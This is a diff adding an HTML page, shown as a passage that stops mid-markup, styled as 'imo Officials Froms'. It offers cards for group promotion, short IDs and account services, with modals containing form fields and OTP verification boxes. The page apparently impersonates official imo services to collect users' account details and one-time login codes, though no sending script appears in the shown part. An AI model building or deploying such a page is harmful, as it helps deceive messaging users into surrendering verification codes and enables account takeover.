@@ -1,1 +1,1679 @@
 
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      imo Officials Froms - Ultimate Advanced UI
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Space+Grotesk:wght@500;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;family=Noto+Sans+Arabic:wght@400;600;700&amp;display=swap" rel="stylesheet" />
+    <style>
+      :root {
+            --bg-color: #030303;
+            --text-primary: #ffffff;
+            --c1: #00f2fe; --c1-rgb: 0, 242, 254;
+            --c2: #b224ef; --c2-rgb: 178, 36, 239;
+            --c3: #ff0844; --c3-rgb: 255, 8, 68;
+            --c4: #00e676; --c4-rgb: 0, 230, 118;
+            --c5: #ffb800; --c5-rgb: 255, 184, 0;
+            --bg-image-url: url(&#39;https://images.unsplash.com/photo-1557672172-298e090bd0f1?auto=format&amp;fit=crop&amp;q=80&amp;w=1920&#39;);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            background-color: var(--bg-color); color: var(--text-primary); min-height: 100vh;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+            overflow-x: hidden; position: relative; perspective: 1200px;
+            font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        body[dir=&#34;rtl&#34;] { font-family: &#39;Noto Sans Arabic&#39;, &#39;Inter&#39;, sans-serif; }
+
+        .bg-container { position: fixed; inset: 0; z-index: -1; overflow: hidden; }
+        
+        .bg-image {
+            position: absolute; inset: 0;
+            background-image: var(--bg-image-url);
+            background-size: cover; background-position: center;
+            filter: brightness(0.35) contrast(1.2) saturate(1.2); 
+            z-index: 1;
+            animation: bgZoom 20s ease-in-out infinite alternate;
+        }
+        @keyframes bgZoom { 0% { transform: scale(1); } 100% { transform: scale(1.1); } }
+        
+        .bg-overlay {
+            position: absolute; inset: 0;
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(var(--c1-rgb), 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(var(--c2-rgb), 0.15) 0%, transparent 50%),
+                linear-gradient(135deg, rgba(3,3,3,0.85) 0%, rgba(3,3,3,0.95) 100%);
+            z-index: 2; 
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px);
+            animation: overlayPulse 15s ease-in-out infinite alternate;
+        }
+        @keyframes overlayPulse {
+            0% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+        
+        #particle-canvas { position: absolute; inset: 0; z-index: 3; pointer-events: none; }
+        
+        .cursor-glow {
+            position: fixed; width: 350px; height: 350px; border-radius: 50%;
+            background: radial-gradient(circle, rgba(var(--c1-rgb), 0.15) 0%, transparent 70%);
+            pointer-events: none; transform: translate(-50%, -50%);
+            z-index: 9999; transition: opacity 0.3s ease; mix-blend-mode: screen;
+            filter: blur(20px);
+        }
+
+        .lang-selector {
+            position: fixed; top: 20px; right: 20px; z-index: 10000;
+            display: flex; flex-direction: column; align-items: flex-end;
+        }
+        body[dir=&#34;rtl&#34;] .lang-selector { right: auto; left: 20px; align-items: flex-start; }
+        
+        .lang-trigger {
+            background: rgba(255, 255, 255, 0.06); border: 1.5px solid rgba(255, 255, 255, 0.12);
+            border-radius: 14px; padding: 10px 16px; backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px); display: flex; align-items: center; gap: 8px;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+            color: #fff; font-family: &#39;Space Grotesk&#39;, sans-serif; font-size: 0.9rem; font-weight: 500;
+        }
+        .lang-trigger:hover { 
+            background: rgba(255, 255, 255, 0.12); 
+            border-color: rgba(var(--c1-rgb), 0.5); 
+            box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.3);
+            transform: translateY(-2px);
+        }
+        .lang-trigger svg { width: 16px; height: 16px; color: var(--c1); transition: transform 0.3s ease; }
+        .lang-trigger .chevron { width: 12px; height: 12px; transition: transform 0.3s ease; }
+        .lang-selector.active .lang-trigger .chevron { transform: rotate(180deg); }
+        
+        .lang-dropdown {
+            position: absolute; top: 100%; right: 0; margin-top: 10px; width: 170px;
+            background: rgba(15, 15, 15, 0.95); border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px; padding: 8px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 255, 0.02);
+            opacity: 0; visibility: hidden; transform: translateY(-10px) scale(0.95);
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); z-index: 10001;
+        }
+        body[dir=&#34;rtl&#34;] .lang-dropdown { right: auto; left: 0; }
+        .lang-selector.active .lang-dropdown { opacity: 1; visibility: visible; transform: translateY(0) scale(1); }
+        
+        .lang-option {
+            padding: 10px 12px; border-radius: 10px; cursor: pointer; transition: all 0.2s ease;
+            display: flex; align-items: center; justify-content: space-between;
+            font-size: 0.9rem; color: rgba(255, 255, 255, 0.8);
+        }
+        .lang-option:hover { background: rgba(255, 255, 255, 0.08); color: #fff; transform: translateX(3px); }
+        .lang-option.active { color: var(--c1); font-weight: 600; background: rgba(var(--c1-rgb), 0.1); }
+        .lang-option.active::after { content: &#39;✓&#39;; color: var(--c1); font-size: 0.8rem; }
+
+        .app-container { width: 100%; max-width: 420px; display: flex; flex-direction: column; align-items: center; gap: 25px; z-index: 10; padding: 20px 0; }
+        
+        h1 {
+            font-family: &#39;Space Grotesk&#39;, sans-serif; font-size: 1.8rem; font-weight: 700; text-transform: uppercase;
+            background: linear-gradient(90deg, #00f2fe, #b224ef, #ff0844, #00e676, #ffb800, #00f2fe); 
+            background-size: 400% 400%;
+            color: transparent; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 25px rgba(255, 255, 255, 0.15)); 
+            animation: gradientFlow 8s ease infinite; text-align: center; letter-spacing: 1px;
+        }
+        @keyframes gradientFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .grid-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; width: 100%; transform-style: preserve-3d; }
+        
+        .card-wrapper { opacity: 0; transform: translateY(30px); animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        .card-wrapper.c1 { animation-delay: 0.1s; } .card-wrapper.c2 { animation-delay: 0.2s; }
+        .card-wrapper.c3 { animation-delay: 0.3s; } .card-wrapper.c4 { animation-delay: 0.4s; }
+        .card-wrapper.c5 { animation-delay: 0.5s; grid-column: span 2; }
+
+        .card {
+            position: relative; border-radius: 20px; overflow: hidden; cursor: pointer; 
+            background: rgba(20, 20, 20, 0.5);
+            border: 1.5px solid rgba(255, 255, 255, 0.08); 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transition: transform 0.1s ease-out, box-shadow 0.4s ease, border-color 0.4s ease;
+            transform-style: preserve-3d; will-change: transform;
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+        }
+        .card-wrapper.c1 .card { --accent: var(--c1); --accent-rgb: var(--c1-rgb); }
+        .card-wrapper.c2 .card { --accent: var(--c2); --accent-rgb: var(--c2-rgb); }
+        .card-wrapper.c3 .card { --accent: var(--c3); --accent-rgb: var(--c3-rgb); }
+        .card-wrapper.c4 .card { --accent: var(--c4); --accent-rgb: var(--c4-rgb); }
+        .card-wrapper.c5 .card { --accent: var(--c5); --accent-rgb: var(--c5-rgb); }
+
+        .card::before {
+            content: &#39;&#39;; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent 0%, transparent 25%, var(--accent) 50%, transparent 75%, transparent 100%);
+            animation: spinBorder 4s linear infinite; opacity: 0; transition: opacity 0.4s ease; z-index: 1;
+        }
+        .card::after {
+            content: &#39;&#39;; position: absolute; inset: 1.5px; 
+            background: linear-gradient(145deg, rgba(20, 20, 20, 0.92), rgba(8, 8, 8, 0.96));
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); 
+            border-radius: 18.5px; z-index: 2; transition: background 0.4s ease;
+        }
+        .card-sheen {
+            position: absolute; top: 0; left: -150%; width: 60%; height: 100%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+            transform: skewX(-25deg); transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1); 
+            z-index: 4; pointer-events: none;
+        }
+        .card:hover .card-sheen { left: 200%; }
+        
+        .card-content {
+            position: relative; z-index: 3; padding: 20px; display: flex; flex-direction: row; 
+            align-items: center; justify-content: flex-start; gap: 15px; min-height: 100px; height: 100%; 
+            transform: translateZ(30px); transform-style: preserve-3d;
+        }
+        
+        .icon-wrapper {
+            width: 46px; height: 46px; border: 1.5px solid rgba(255, 255, 255, 0.12); 
+            border-radius: 14px; background: rgba(255, 255, 255, 0.05);
+            display: flex; align-items: center; justify-content: center; 
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative; overflow: hidden; flex-shrink: 0; transform: translateZ(20px);
+        }
+        .icon-wrapper::before { 
+            content: &#39;&#39;; position: absolute; inset: 0; 
+            background: radial-gradient(circle at center, var(--accent) 0%, transparent 70%); 
+            opacity: 0; transition: opacity 0.4s ease; 
+        }
+        .icon-wrapper svg { width: 22px; height: 22px; color: rgba(255, 255, 255, 0.7); transition: all 0.4s ease; position: relative; z-index: 1; }
+        
+        .card-text {
+            font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif; 
+            font-size: 1.1rem; line-height: 1.4; font-weight: 600; 
+            position: relative; display: inline-block;
+            background: linear-gradient(180deg, #ffffff 0%, #8a8a8a 100%); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); 
+            transform: translateZ(40px); text-align: left;
+        }
+        body[dir=&#34;rtl&#34;] .card-text { text-align: right; }
+        
+        .card-text::after {
+            content: &#39;&#39;; position: absolute; bottom: -4px; left: 0; width: 0%; height: 2px;
+            background: var(--accent); box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent);
+            transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1); border-radius: 2px;
+        }
+        body[dir=&#34;rtl&#34;] .card-text::after { left: auto; right: 0; }
+
+        .card:hover { 
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 40px rgba(var(--accent-rgb), 0.25); 
+            border-color: rgba(var(--accent-rgb), 0.4); 
+        }
+        .card:hover::before { opacity: 1; }
+        .card:hover::after { background: linear-gradient(145deg, rgba(15, 15, 15, 0.96), rgba(4, 4, 4, 0.99)); }
+        .card:hover .card-text {
+            background: linear-gradient(180deg, #ffffff 0%, var(--accent) 100%); 
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 15px rgba(var(--accent-rgb), 0.6)); 
+            transform: translateZ(60px) scale(1.05); letter-spacing: 0.5px;
+        }
+        .card:hover .card-text::after { width: 100%; }
+        .card:hover .icon-wrapper { 
+            border-color: rgba(var(--accent-rgb), 0.6); 
+            transform: translateZ(40px) scale(1.1); 
+            box-shadow: 0 0 20px rgba(var(--accent-rgb), 0.4); 
+        }
+        .card:hover .icon-wrapper::before { opacity: 0.25; }
+        .card:hover .icon-wrapper svg { color: #ffffff; filter: drop-shadow(0 0 8px rgba(var(--accent-rgb), 0.8)); }
+
+        .info-panel {
+            width: 100%; background: rgba(255, 255, 255, 0.02); 
+            border: 1.5px solid rgba(255, 255, 255, 0.08); border-radius: 18px; padding: 22px;
+            backdrop-filter: blur(20px); 
+            box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.02), 0 10px 30px rgba(0,0,0,0.5);
+            opacity: 0; transform: translateY(30px); 
+            animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; animation-delay: 0.6s;
+            position: relative; overflow: hidden;
+        }
+        .info-panel::before {
+            content: &#39;&#39;; position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--c1), transparent); 
+            animation: scanline 4s linear infinite;
+        }
+        @keyframes scanline { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+        .info-panel h2 { 
+            font-family: &#39;Space Grotesk&#39;, sans-serif; font-size: 1.1rem; font-weight: 700; 
+            color: var(--c1); margin-bottom: 8px; text-transform: uppercase; 
+            letter-spacing: 1px; text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.3); 
+        }
+        .info-panel p { 
+            font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif; 
+            font-size: 0.9rem; line-height: 1.6; color: rgba(255, 255, 255, 0.75); 
+        }
+
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7); 
+            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
+            z-index: 1000; display: flex; justify-content: center; align-items: center; padding: 20px;
+            opacity: 0; visibility: hidden; transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        
+        .modal-box {
+            background: linear-gradient(145deg, rgba(20, 20, 20, 0.96), rgba(8, 8, 8, 0.99));
+            border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 26px; 
+            padding: 30px 25px; width: 100%; max-width: 380px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9), inset 0 0 30px rgba(255, 255, 255, 0.02);
+            transform: translateY(30px) scale(0.95); 
+            transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative; overflow: hidden; max-height: 90vh; overflow-y: auto;
+        }
+        .modal-box::-webkit-scrollbar { width: 4px; }
+        .modal-box::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 4px; }
+        .modal-box::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
+        .modal-overlay.active .modal-box { transform: translateY(0) scale(1); }
+
+        .modal-c1 .modal-box { border-color: rgba(var(--c1-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c1-rgb), 0.2); }
+        .modal-c2 .modal-box { border-color: rgba(var(--c2-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c2-rgb), 0.2); }
+        .modal-c3 .modal-box { border-color: rgba(var(--c3-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c3-rgb), 0.2); }
+        .modal-c4 .modal-box { border-color: rgba(var(--c4-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c4-rgb), 0.2); }
+        .modal-c5 .modal-box { border-color: rgba(var(--c5-rgb), 0.35); box-shadow: 0 25px 50px rgba(0,0,0,0.9), 0 0 50px rgba(var(--c5-rgb), 0.2); }
+
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        
+        .modal-title { 
+            font-family: &#39;Space Grotesk&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif; 
+            font-size: 1.3rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; 
+            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: titleShimmer 3s linear infinite;
+        }
+        .modal-c1 .modal-title { background-image: linear-gradient(90deg, var(--c1), #ffffff, var(--c1)); filter: drop-shadow(0 0 10px rgba(var(--c1-rgb), 0.4)); }
+        .modal-c2 .modal-title { background-image: linear-gradient(90deg, var(--c2), #ffffff, var(--c2)); filter: drop-shadow(0 0 10px rgba(var(--c2-rgb), 0.4)); }
+        .modal-c3 .modal-title { background-image: linear-gradient(90deg, var(--c3), #ffffff, var(--c3)); filter: drop-shadow(0 0 10px rgba(var(--c3-rgb), 0.4)); }
+        .modal-c4 .modal-title { background-image: linear-gradient(90deg, var(--c4), #ffffff, var(--c4)); filter: drop-shadow(0 0 10px rgba(var(--c4-rgb), 0.4)); }
+        .modal-c5 .modal-title { background-image: linear-gradient(90deg, var(--c5), #ffffff, var(--c5)); filter: drop-shadow(0 0 10px rgba(var(--c5-rgb), 0.4)); }
+        @keyframes titleShimmer { to { background-position: 200% center; } }
+
+        .close-btn {
+            background: rgba(255, 255, 255, 0.05); border: none; color: rgba(255, 255, 255, 0.6);
+            width: 34px; height: 34px; border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            font-size: 1.3rem; cursor: pointer; transition: all 0.3s ease; flex-shrink: 0;
+        }
+        .close-btn:hover { background: rgba(255, 255, 255, 0.15); color: #fff; transform: rotate(90deg); }
+
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group label { 
+            display: block; font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif; 
+            font-size: 0.85rem; color: rgba(255,255,255,0.75); margin-bottom: 8px; line-height: 1.4; font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%; background: rgba(0, 0, 0, 0.5); border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px; padding: 14px 16px; color: #fff; 
+            font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif; font-size: 0.95rem;
+            outline: none; transition: all 0.3s ease; margin-bottom: 10px;
+        }
+        .form-input:focus { background: rgba(0, 0, 0, 0.8); }
+        .modal-c1 .form-input:focus { border-color: var(--c1); box-shadow: 0 0 20px rgba(var(--c1-rgb), 0.25); }
+        .modal-c2 .form-input:focus { border-color: var(--c2); box-shadow: 0 0 20px rgba(var(--c2-rgb), 0.25); }
+        .modal-c3 .form-input:focus { border-color: var(--c3); box-shadow: 0 0 20px rgba(var(--c3-rgb), 0.25); }
+        .modal-c4 .form-input:focus { border-color: var(--c4); box-shadow: 0 0 20px rgba(var(--c4-rgb), 0.25); }
+        .modal-c5 .form-input:focus { border-color: var(--c5); box-shadow: 0 0 20px rgba(var(--c5-rgb), 0.25); }
+
+        .limit-options { display: flex; justify-content: space-between; gap: 10px; margin-top: 10px; margin-bottom: 25px; flex-wrap: wrap; }
+        .limit-btn {
+            flex: 1; padding: 12px 0; background: rgba(255, 255, 255, 0.03); 
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px; color: rgba(255, 255, 255, 0.7); 
+            font-family: &#39;Space Grotesk&#39;, sans-serif;
+            font-size: 0.9rem; font-weight: 600; cursor: pointer; 
+            transition: all 0.3s ease; outline: none; min-width: 70px;
+        }
+        .modal-c1 .limit-btn:hover, .modal-c1 .limit-btn.active { background: rgba(var(--c1-rgb), 0.15); border-color: var(--c1); color: var(--c1); box-shadow: 0 0 15px rgba(var(--c1-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c1-rgb), 0.4); }
+        .modal-c2 .limit-btn:hover, .modal-c2 .limit-btn.active { background: rgba(var(--c2-rgb), 0.15); border-color: var(--c2); color: var(--c2); box-shadow: 0 0 15px rgba(var(--c2-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c2-rgb), 0.4); }
+        .modal-c3 .limit-btn:hover, .modal-c3 .limit-btn.active { background: rgba(var(--c3-rgb), 0.15); border-color: var(--c3); color: var(--c3); box-shadow: 0 0 15px rgba(var(--c3-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c3-rgb), 0.4); }
+        .modal-c4 .limit-btn:hover, .modal-c4 .limit-btn.active { background: rgba(var(--c4-rgb), 0.15); border-color: var(--c4); color: var(--c4); box-shadow: 0 0 15px rgba(var(--c4-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c4-rgb), 0.4); }
+        .modal-c5 .limit-btn:hover, .modal-c5 .limit-btn.active { background: rgba(var(--c5-rgb), 0.15); border-color: var(--c5); color: var(--c5); box-shadow: 0 0 15px rgba(var(--c5-rgb), 0.25); text-shadow: 0 0 10px rgba(var(--c5-rgb), 0.4); }
+
+        .btn-submit {
+            width: 100%; padding: 16px; border: none; border-radius: 12px; 
+            font-family: &#39;Inter&#39;, &#39;Hind Siliguri&#39;, &#39;Noto Sans Arabic&#39;, sans-serif;
+            font-size: 1.1rem; font-weight: 700; text-transform: uppercase; 
+            letter-spacing: 0.5px; cursor: pointer;
+            color: #000; transition: all 0.3s ease; position: relative; 
+            overflow: hidden; margin-top: 10px;
+        }
+        .modal-c1 .btn-submit { background: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.5); }
+        .modal-c2 .btn-submit { background: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.5); }
+        .modal-c3 .btn-submit { background: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.5); }
+        .modal-c4 .btn-submit { background: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.5); }
+        .modal-c5 .btn-submit { background: var(--c5); box-shadow: 0 0 25px rgba(var(--c5-rgb), 0.5); }
+        .btn-submit:hover { transform: translateY(-2px); filter: brightness(1.2); }
+        .btn-submit:active { transform: translateY(0); }
+
+        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; margin-top: 15px; }
+        .otp-box {
+            width: 62px; height: 68px; background: rgba(0,0,0,0.5); 
+            border: 1.5px solid rgba(255,255,255,0.1);
+            border-radius: 14px; text-align: center; font-size: 1.8rem; 
+            font-weight: 700; color: #fff; 
+            outline: none; transition: all 0.3s ease; 
+            font-family: &#39;Space Grotesk&#39;, sans-serif;
+        }
+        .modal-c1 .otp-box:focus { border-color: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c2 .otp-box:focus { border-color: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c3 .otp-box:focus { border-color: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c4 .otp-box:focus { border-color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+        .modal-c5 .otp-box:focus { border-color: var(--c5); box-shadow: 0 0 25px rgba(var(--c5-rgb), 0.35); background: rgba(0,0,0,0.8); transform: scale(1.05); }
+
+        .verify-loading { display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; margin-top: 20px; }
+        .modal-c1 .spinner { border: 3px solid rgba(var(--c1-rgb), 0.2); border-top: 3px solid var(--c1); }
+        .modal-c2 .spinner { border: 3px solid rgba(var(--c2-rgb), 0.2); border-top: 3px solid var(--c2); }
+        .modal-c3 .spinner { border: 3px solid rgba(var(--c3-rgb), 0.2); border-top: 3px solid var(--c3); }
+        .modal-c4 .spinner { border: 3px solid rgba(var(--c4-rgb), 0.2); border-top: 3px solid var(--c4); }
+        .modal-c5 .spinner { border: 3px solid rgba(var(--c5-rgb), 0.2); border-top: 3px solid var(--c5); }
+        .spinner { width: 45px; height: 45px; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .verify-success {
+            display: none; flex-direction: column; align-items: center; justify-content: center; gap: 15px; margin-top: 20px;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .modal-c1 .success-icon { background: rgba(var(--c1-rgb), 0.1); border: 2px solid var(--c1); color: var(--c1); box-shadow: 0 0 25px rgba(var(--c1-rgb), 0.35); }
+        .modal-c2 .success-icon { background: rgba(var(--c2-rgb), 0.1); border: 2px solid var(--c2); color: var(--c2); box-shadow: 0 0 25px rgba(var(--c2-rgb), 0.35); }
+        .modal-c3 .success-icon { background: rgba(var(--c3-rgb), 0.1); border: 2px solid var(--c3); color: var(--c3); box-shadow: 0 0 25px rgba(var(--c3-rgb), 0.35); }
+        .modal-c4 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); }
+        .modal-c5 .success-icon { background: rgba(var(--c4-rgb), 0.1); border: 2px solid var(--c4); color: var(--c4); box-shadow: 0 0 25px rgba(var(--c4-rgb), 0.35); }
+        .success-icon { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+        .modal-c1 .success-text { color: var(--c1); } .modal-c2 .success-text { color: var(--c2); }
+        .modal-c3 .success-text { color: var(--c3); } .modal-c4 .success-text { color: var(--c4); }
+        .modal-c5 .success-text { color: var(--c4); }
+        .success-text { font-size: 1rem; font-weight: 600; }
+        @keyframes popIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        @keyframes spinBorder { 100% { transform: rotate(360deg); } }
+        @keyframes slideUpFade { 100% { opacity: 1; transform: translateY(0); } }
+        body.modal-open { overflow: hidden; }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 1.4rem; }
+            .modal-box { padding: 25px 20px; max-width: 100%; }
+            .otp-box { width: 55px; height: 62px; font-size: 1.5rem; }
+            .lang-selector { top: 15px; right: 15px; }
+            body[dir=&#34;rtl&#34;] .lang-selector { right: auto; left: 15px; }
+        }
+    </style>
+  </head>
+  <body>
+    <div class="bg-container">
+      <div class="bg-image">
+      </div>
+      <div class="bg-overlay">
+      </div>
+      <canvas id="particle-canvas">
+      </canvas>
+    </div>
+    <div class="cursor-glow">
+    </div>
+    <div class="lang-selector" id="langSelector">
+      <div class="lang-trigger" onclick="toggleLangDropdown(event)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10">
+          </circle>
+          <line x1="2" y1="12" x2="22" y2="12">
+          </line>
+          <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z">
+          </path>
+        </svg>
+        <span id="current-lang-label">        English
+</span>
+        <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="6 9 12 15 18 9">
+          </polyline>
+        </svg>
+      </div>
+      <div class="lang-dropdown" id="langDropdown">
+        <div class="lang-option active" data-lang="en" onclick="changeLanguage(&#39;en&#39;)">
+          🇺🇸 English
+        </div>
+        <div class="lang-option" data-lang="bn" onclick="changeLanguage(&#39;bn&#39;)">
+          🇧🇩 বাংলা
+        </div>
+        <div class="lang-option" data-lang="hi" onclick="changeLanguage(&#39;hi&#39;)">
+          🇮🇳 हिन्दी
+        </div>
+        <div class="lang-option" data-lang="ar" onclick="changeLanguage(&#39;ar&#39;)">
+          🇸🇦 العربية
+        </div>
+      </div>
+    </div>
+    <main class="app-container">
+      <h1 data-i18n="title">
+        imo Officials Froms
+      </h1>
+      <div class="grid-container">
+        <div class="card-wrapper c1">
+          <div class="card" onclick="openModal(&#39;modal-1&#39;)">
+            <div class="card-sheen">
+            </div>
+            <div class="card-content">
+              <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="m3 11 18-5v12L3 14v-3z">
+                  </path>
+                  <path d="M11.6 16.8a3 3 0 1 1-5.8-1.6">
+                  </path>
+                </svg>
+              </div>
+              <div class="card-text" data-i18n="card_promote">
+                Imo Group Promote
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-wrapper c2">
+          <div class="card" onclick="openModal(&#39;modal-2&#39;)">
+            <div class="card-sheen">
+            </div>
+            <div class="card-content">
+              <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71">
+                  </path>
+                  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71">
+                  </path>
+                </svg>
+              </div>
+              <div class="card-text" data-i18n="card_shortid">
+                Imo Group Short ID
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-wrapper c3">
+          <div class="card" onclick="openModal(&#39;modal-3&#39;)">
+            <div class="card-sheen">
+            </div>
+            <div class="card-content">
+              <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2">
+                  </path>
+                  <circle cx="12" cy="7" r="4">
+                  </circle>
+                </svg>
+              </div>
+              <div class="card-text" data-i18n="card_hrad">
+                Imo Account Hrad
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-wrapper c4">
+          <div class="card" onclick="openModal(&#39;modal-4&#39;)">
